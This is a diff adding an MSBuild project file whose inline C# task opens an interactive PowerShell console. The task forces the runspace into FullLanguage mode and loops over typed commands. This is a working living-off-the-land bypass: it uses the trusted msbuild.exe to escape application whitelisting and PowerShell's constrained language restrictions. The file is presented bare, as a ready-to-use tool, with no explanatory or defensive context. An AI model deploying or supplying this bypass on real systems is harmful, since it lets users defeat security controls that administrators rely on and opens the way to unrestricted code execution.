@@ -1,0 +1,76 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Hello">
+   <ClassExample />
+  </Target>
+    <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+     <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
+
+      <Code Type="Class" Language="cs">
+        <![CDATA[				
+            using System;
+	    using System.IO;
+            using System.Reflection;
+            using Microsoft.Build.Framework;
+            using Microsoft.Build.Utilities;
+            using System.Threading;
+            using System.Collections.ObjectModel;
+            using System.Management.Automation;
+            using System.Management.Automation.Runspaces;
+            using System.Text;
+                 
+            public class ClassExample :  Task, ITask
+            {
+                public override bool Execute()
+                {
+                    BreakOut.RunPSCommand();				
+                    return true;
+                }
+            }
+             
+            public class BreakOut
+            {
+                public static string RunPSCommand()
+                {
+					Console.Write("PowerShell> ");
+					String cmd = Console.ReadLine();
+
+					// Create a session state                    
+					InitialSessionState iss = InitialSessionState.CreateDefault();
+
+					// Set full language mode
+					iss.LanguageMode = PSLanguageMode.FullLanguage;
+
+					// Create runspace
+					Runspace rs = RunspaceFactory.CreateRunspace(iss);
+					rs.Open();
+
+					PowerShell ps = PowerShell.Create();
+					ps.Runspace = rs;
+					ps.AddScript(cmd);
+
+					Collection<PSObject> output = ps.Invoke();
+					if (output != null)
+					{
+						foreach (PSObject rtnItem in output)
+						{
+							Console.WriteLine(rtnItem.ToString());
+						}
+					}
+					rs.Close();
+
+					Console.ReadLine();
+					// Return to the console
+					RunPSCommand();
+                    return "WEEEE";       							
+                }
+            }
+                             
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
